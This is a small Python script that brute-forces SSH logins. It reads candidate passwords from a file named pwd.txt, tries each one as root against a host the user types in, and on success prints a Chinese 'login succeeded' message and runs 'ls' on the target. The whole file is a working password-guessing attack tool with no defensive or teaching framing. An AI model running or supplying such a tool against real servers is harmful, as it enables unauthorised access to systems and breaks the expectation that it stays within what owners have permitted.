import paramiko
from threading import *
def sshclient_cmd(hostname,port,username,password,execmd):
    try:
        paramiko.util.log_to_file("paramiko.log")
        s = paramiko.SSHClient()
        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        s.connect(hostname=hostname, port=port, username=username, password=password)
        stdin,stdout,stderr = s.exec_command(execmd)
        stdin.write("Y")
        print("登录成功")
        print(stdout.read())
        s.close()
    except:
        print("ssh login was error")

def main(password,hostname):
    port = 22
    username = 'root'
#    password = '123456'
    execmd = 'ls'
    print(password)
    sshclient_cmd(hostname, port, username, password, execmd)

def dicgen(hostname):
    file_path = 'pwd.txt'
    for line in open(file_path):
        a = line.strip('\r').strip('\n')
        main(a,hostname)
if __name__ == '__main__':
    hostname = input("Please input your ssh target:")
    dicgen(hostname)

